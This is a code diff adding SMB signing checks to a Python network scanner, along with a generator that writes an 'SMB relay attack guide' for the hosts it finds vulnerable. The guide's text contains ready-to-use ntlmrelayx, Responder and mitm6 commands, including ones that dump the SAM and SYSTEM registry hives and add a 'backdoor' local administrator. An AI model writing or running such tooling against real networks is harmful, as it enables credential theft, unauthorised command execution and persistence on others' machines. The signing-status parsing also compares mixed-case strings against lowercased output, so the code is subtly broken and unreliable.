@@ -386,6 +386,65 @@ def enumerate_shares_rpcclient(ip: str, username: str = '', password: str = '',
     except Exception as e:
         return None, str(e)
 
+def check_smb_signing(ip: str, timeout: int = 5) -> Dict:
+    """
+    Check SMB signing status using crackmapexec.
+    
+    Args:
+        ip: Target IP address
+        timeout: Command timeout in seconds
+        
+    Returns:
+        Dict with signing status
+    """
+    result = {
+        'signing_enabled': False,
+        'signing_required': False,
+        'relay_vulnerable': False,
+        'error': None
+    }
+    
+    try:
+        # Use crackmapexec to check SMB signing
+        cmd = ['crackmapexec', 'smb', ip, '--gen-relay-list', 'temp_relay.txt']
+        
+        proc = subprocess.run(
+            cmd,
+            capture_output=True,
+            text=True,
+            timeout=timeout
+        )
+        
+        output = proc.stdout + proc.stderr
+        
+        # Parse output for signing status
+        if 'signing:False' in output.lower():
+            result['signing_enabled'] = False
+            result['signing_required'] = False
+            result['relay_vulnerable'] = True
+        elif 'signing:True' in output.lower():
+            result['signing_enabled'] = True
+            # Check if required or just enabled
+            if 'signing required' not in output.lower():
+                result['signing_required'] = False
+                result['relay_vulnerable'] = True
+            else:
+                result['signing_required'] = True
+                result['relay_vulnerable'] = False
+        
+        # Clean up temp file
+        if os.path.exists('temp_relay.txt'):
+            os.remove('temp_relay.txt')
+        
+    except subprocess.TimeoutExpired:
+        result['error'] = 'Timeout'
+    except FileNotFoundError:
+        result['error'] = 'crackmapexec not found - install with: apt install crackmapexec'
+    except Exception as e:
+        result['error'] = str(e)
+    
+    return result
+
 def scan_host(ip: str, timeout: int = 2, test_access: bool = False, 
               username: str = '', password: str = '') -> Dict:
     """
@@ -411,6 +470,7 @@ def scan_host(ip: str, timeout: int = 2, test_access: bool = False,
         'interesting_shares': [],
         'null_session': False,
         'guest_access': False,
+        'smb_signing': None,
         'error': None
     }
     
@@ -431,6 +491,10 @@ def scan_host(ip: str, timeout: int = 2, test_access: bool = False,
         return result
     
     result['smb_enabled'] = True
+    
+    # Check SMB signing status
+    signing_result = check_smb_signing(ip, timeout=5)
+    result['smb_signing'] = signing_result
     
     # Try to enumerate shares (null session first)
     shares, error = enumerate_shares_smbclient(ip, '', '', timeout=10)
@@ -556,6 +620,18 @@ def save_details(results: List[Dict], txt_filename: str = 'smb_details.txt',
                 
                 f.write(f"Ports: {', '.join(str(p['port']) for p in result['ports_open'])}\n")
                 
+                # SMB signing status
+                if result['smb_signing']:
+                    signing = result['smb_signing']
+                    if signing['relay_vulnerable']:
+                        f.write("⚠⚠⚠ SMB RELAY VULNERABLE - SIGNING DISABLED/NOT REQUIRED ⚠⚠⚠\n")
+                    elif signing['signing_required']:
+                        f.write("✓ SMB SIGNING REQUIRED (Protected)\n")
+                    elif signing['signing_enabled']:
+                        f.write("⚠ SMB SIGNING ENABLED (Not Required - Still Vulnerable)\n")
+                    if signing['error']:
+                        f.write(f"  Signing Check Error: {signing['error']}\n")
+                
                 if result['null_session']:
                     f.write("⚠ NULL SESSION ALLOWED\n")
                 if result['guest_access']:
@@ -603,6 +679,148 @@ def save_details(results: List[Dict], txt_filename: str = 'smb_details.txt',
     
     except Exception as e:
         print(f"{Colors.FAIL}[!] Error saving JSON details: {e}{Colors.ENDC}")
+
+def save_relay_targets(results: List[Dict], filename: str = 'smb_relay_targets.txt'):
+    """
+    Save list of SMB relay-vulnerable hosts to a file.
+    
+    Args:
+        results: List of scan result dicts
+        filename: Output filename
+    """
+    try:
+        relay_targets = []
+        
+        for result in results:
+            if result['smb_enabled'] and result['smb_signing']:
+                if result['smb_signing']['relay_vulnerable']:
+                    relay_targets.append(result)
+        
+        if not relay_targets:
+            return 0
+        
+        with open(filename, 'w') as f:
+            for result in relay_targets:
+                f.write(f"{result['ip']}\n")
+        
+        print(f"{Colors.OKGREEN}[+] Relay targets saved to: {filename}{Colors.ENDC}")
+        return len(relay_targets)
+        
+    except Exception as e:
+        print(f"{Colors.FAIL}[!] Error saving relay targets: {e}{Colors.ENDC}")
+        return 0
+
+def save_smb_attack_guide(results: List[Dict], filename: str = 'SMB_ATTACK_GUIDE.txt'):
+    """
+    Generate attack guide for SMB relay vulnerabilities.
+    
+    Args:
+        results: List of scan result dicts
+        filename: Output filename
+    """
+    try:
+        relay_targets = []
+        signing_enabled = []
+        signing_required = []
+        
+        for result in results:
+            if result['smb_enabled'] and result['smb_signing']:
+                signing = result['smb_signing']
+                if signing['relay_vulnerable']:
+                    relay_targets.append(result)
+                elif signing['signing_enabled'] and not signing['signing_required']:
+                    signing_enabled.append(result)
+                elif signing['signing_required']:
+                    signing_required.append(result)
+        
+        if not relay_targets:
+            return
+        
+        with open(filename, 'w') as f:
+            f.write("=" * 70 + "\n")
+            f.write("SMB RELAY ATTACK GUIDE\n")
+            f.write("=" * 70 + "\n\n")
+            
+            f.write(f"[+] Found {len(relay_targets)} SMB relay-vulnerable hosts!\n\n")
+            
+            # Summary
+            f.write("SMB Signing Status Summary:\n")
+            f.write(f"  • Relay Vulnerable (Signing Disabled/Not Required): {len(relay_targets)}\n")
+            f.write(f"  • Signing Enabled (Not Required): {len(signing_enabled)}\n")
+            f.write(f"  • Signing Required (Protected): {len(signing_required)}\n\n")
+            
+            # Relay targets
+            f.write("Relay-Vulnerable Hosts:\n")
+            f.write("-" * 70 + "\n")
+            for result in relay_targets:
+                hostname_str = f" ({result['hostname']})" if result['hostname'] else ""
+                f.write(f"  • {result['ip']}{hostname_str}\n")
+            f.write("\n")
+            
+            # Attack workflow
+            f.write("=" * 70 + "\n")
+            f.write("RECOMMENDED ATTACK WORKFLOW\n")
+            f.write("=" * 70 + "\n\n")
+            
+            f.write("1. START NTLMRELAYX (Terminal 1)\n")
+            f.write("-" * 70 + "\n")
+            f.write("   Relay to SMB targets:\n")
+            f.write(f"   impacket-ntlmrelayx -tf smb_relay_targets.txt -smb2support\n\n")
+            f.write("   Or relay to specific high-value target:\n")
+            f.write(f"   impacket-ntlmrelayx -t {relay_targets[0]['ip']} -smb2support -c 'whoami'\n\n")
+            
+            f.write("2. START RESPONDER (Terminal 2)\n")
+            f.write("-" * 70 + "\n")
+            f.write("   Poison LLMNR/NBT-NS to capture hashes:\n")
+            f.write("   sudo responder -I eth0 -wrf\n\n")
+            f.write("   Note: Monitor Responder logs:\n")
+            f.write("   tail -f /usr/share/responder/logs/*\n\n")
+            
+            f.write("3. WAIT FOR AUTHENTICATION (Both Terminals)\n")
+            f.write("-" * 70 + "\n")
+            f.write("   ntlmrelayx will automatically relay captured credentials\n")
+            f.write("   to targets in smb_relay_targets.txt\n\n")
+            
+            f.write("4. ALTERNATIVE: MITM6 FOR IPv6 ATTACKS\n")
+            f.write("-" * 70 + "\n")
+            f.write("   Instead of Responder, use mitm6:\n")
+            f.write("   sudo mitm6 -d domain.local\n\n")
+            
+            f.write("=" * 70 + "\n")
+            f.write("IMPORTANT NOTES\n")
+            f.write("=" * 70 + "\n\n")
+            
+            f.write("• Hashes captured by Responder can be cracked with hashsweep\n")
+            f.write("• ntlmrelayx will attempt to execute commands if successful\n")
+            f.write("• Monitor both tools for successful relays\n")
+            f.write("• Consider using '-c' flag with ntlmrelayx for command execution\n")
+            f.write("• For dumps: use '-c' with secretsdump commands\n\n")
+            
+            f.write("EXAMPLE COMMANDS:\n")
+            f.write("-" * 70 + "\n")
+            f.write("# Dump SAM database:\n")
+            f.write("impacket-ntlmrelayx -tf smb_relay_targets.txt -smb2support \\\n")
+            f.write("  -c 'reg save HKLM\\SAM sam.save && reg save HKLM\\SYSTEM system.save'\n\n")
+            
+            f.write("# Add user to local admins:\n")
+            f.write("impacket-ntlmrelayx -tf smb_relay_targets.txt -smb2support \\\n")
+            f.write("  -c 'net localgroup administrators /add backdoor'\n\n")
+            
+            f.write("# Execute remote command:\n")
+            f.write("impacket-ntlmrelayx -tf smb_relay_targets.txt -smb2support \\\n")
+            f.write("  -c 'powershell -Command \"whoami; ipconfig\"'\n\n")
+            
+            f.write("=" * 70 + "\n")
+            f.write("REFERENCES\n")
+            f.write("=" * 70 + "\n\n")
+            f.write("• https://www.hackingarticles.in/ntlm-relay-attack-guide/\n")
+            f.write("• https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py\n")
+            f.write("• https://www.rapid7.com/blog/post/2017/07/17/ntlm-relay-attacks/\n\n")
+        
+        print(f"{Colors.OKGREEN}[+] SMB attack guide saved to: {filename}{Colors.ENDC}")
+        
+    except Exception as e:
+        print(f"{Colors.FAIL}[!] Error saving attack guide: {e}{Colors.ENDC}")
 
 def main():
     parser = argparse.ArgumentParser(
@@ -716,7 +934,15 @@ Examples:
                         null_str = f"{Colors.WARNING} [NULL SESSION]{Colors.ENDC}" if result['null_session'] else ""
                         guest_str = f"{Colors.WARNING} [GUEST ACCESS]{Colors.ENDC}" if result['guest_access'] else ""
                         
-                        print(f"{confidence} {result['ip']}{hostname_str}{shares_str}{access_str}{null_str}{guest_str}")
+                        # SMB signing status
+                        signing_str = ""
+                        if result['smb_signing']:
+                            if result['smb_signing']['relay_vulnerable']:
+                                signing_str = f"{Colors.FAIL} [RELAY VULNERABLE]{Colors.ENDC}"
+                            elif result['smb_signing']['signing_required']:
+                                signing_str = f"{Colors.OKGREEN} [SIGNING REQUIRED]{Colors.ENDC}"
+                        
+                        print(f"{confidence} {result['ip']}{hostname_str}{shares_str}{access_str}{null_str}{guest_str}{signing_str}")
                         
                         # Show interesting shares
                         if result['interesting_shares']:
@@ -754,11 +980,20 @@ Examples:
     null_session_hosts = sum(1 for r in results if r['null_session'])
     guest_access_hosts = sum(1 for r in results if r['guest_access'])
     
+    # SMB signing statistics
+    relay_vulnerable = sum(1 for r in results if r['smb_signing'] and r['smb_signing']['relay_vulnerable'])
+    signing_required = sum(1 for r in results if r['smb_signing'] and r['smb_signing']['signing_required'])
+    
     print(f"Hosts with Shares: {hosts_with_shares}")
     if args.test_access:
         print(f"Hosts with Accessible Shares: {hosts_with_access}")
     print(f"Null Session Allowed: {null_session_hosts}")
     print(f"Guest Access Allowed: {guest_access_hosts}")
+    
+    # Highlight relay vulnerabilities
+    if relay_vulnerable > 0:
+        print(f"{Colors.FAIL}SMB Relay Vulnerable: {relay_vulnerable} ⚠{Colors.ENDC}")
+    print(f"SMB Signing Required: {signing_required}")
     
     # Save results
     if smb_found > 0:
@@ -767,6 +1002,13 @@ Examples:
         if hosts_with_access > 0:
             save_share_list(results)
         save_details(results)
+        
+        # Save relay targets and attack guide
+        relay_count = save_relay_targets(results)
+        if relay_count > 0:
+            save_smb_attack_guide(results)
+            print(f"\n{Colors.WARNING}[!] CRITICAL: {relay_count} hosts vulnerable to SMB relay attacks!{Colors.ENDC}")
+            print(f"{Colors.WARNING}[!] Review SMB_ATTACK_GUIDE.txt for exploitation steps{Colors.ENDC}")
     
     return 0
 
